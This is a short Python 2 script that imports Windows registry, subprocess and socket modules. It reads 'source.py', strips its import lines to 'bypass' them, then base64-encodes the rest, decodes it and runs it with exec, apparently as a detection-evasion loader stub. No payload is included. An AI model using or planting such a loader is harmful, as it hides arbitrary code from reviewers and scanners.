import base64
import subprocess
import tempfile
import _winreg
import platform
import time
import os
import socket
import urllib3
source = ''
with open('source.py', 'r') as file:
    for line in file:
        #bypass import commands
        if "import" not in line:
            source += line
encode = base64.b64encode(source)
exec (base64.b64decode(encode))
